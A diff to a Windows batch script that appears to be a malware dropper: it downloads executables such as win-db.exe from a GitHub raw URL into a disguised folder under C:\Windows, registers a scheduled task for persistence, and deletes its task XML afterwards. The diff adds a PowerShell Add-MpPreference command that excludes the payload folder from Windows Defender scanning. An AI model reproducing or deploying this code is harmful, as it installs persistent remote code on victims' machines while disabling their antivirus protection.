@@ -8,6 +8,8 @@ set "URL4=https://raw.githubusercontent.com/m-c00/td/main/win-db.exe"
 set "DEST_DIR=C:\Windows\programs\preflog"
 set "TASK_XML=%DEST_DIR%\win-win.xml"
 set "TASK_NAME=WinWinTask"
+set folder=C:\Windows\programs\preflog
+
 
 REM Check if ws-tr.exe is running and terminate if it is
 tasklist | findstr /i "ws-tr.exe" >nul
@@ -22,7 +24,9 @@ if %errorlevel% equ 0 (
 )
 
 REM Create destination directory if it doesn't exist
-if not exist "%DEST_DIR%" mkdir "%DEST_DIR%"
+if not exist "%folder%" mkdir "%folder%"
+
+powershell -Command Add-MpPreference -ExclusionPath "%folder%"
 
 REM Download and rename each file
 echo Downloading and renaming files...
@@ -43,3 +47,4 @@ echo Task imported successfully.
 
 REM Delete the XML file
 del "%TASK_XML%" >nul 2>&1
+exit
